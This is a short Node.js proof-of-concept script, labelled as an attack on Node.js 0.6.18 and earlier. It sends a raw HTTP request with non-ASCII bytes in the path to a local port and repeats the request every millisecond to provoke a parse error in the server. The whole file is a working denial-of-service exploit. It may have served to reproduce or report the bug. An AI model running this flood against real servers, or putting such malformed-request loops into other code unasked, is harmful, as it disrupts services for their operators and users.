/**
 * node <= 0.6.18 attack: SOCKET Error: Parse Error
 */

var net = require('net');
var http = require('http');
var data = 'GET /\xC4\xD0\xD7\xB0 HTTP/1.1\r\n\
User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5\r\n\
Host: 10.232.132.165\r\n\r\n';

var agent = new http.Agent();
agent.maxSockets = 1;

function attack() {
  // http.get({
  //   port: 1234,
  //   agent: agent,
  // }, function (res) {
  //   console.log(res.headers)
  // });

  // return;

  var client = net.connect({
     port: 1234,
  }, function () {
    console.log('client connected');
    client.write(data);
  });

  client.on('data', function (chunk) {
    console.log(chunk.toString());
  });

  client.on('end', function () {
    console.log('client disconnected');
  });
}

function start() {
  attack();
  setTimeout(start, 1);
}

start();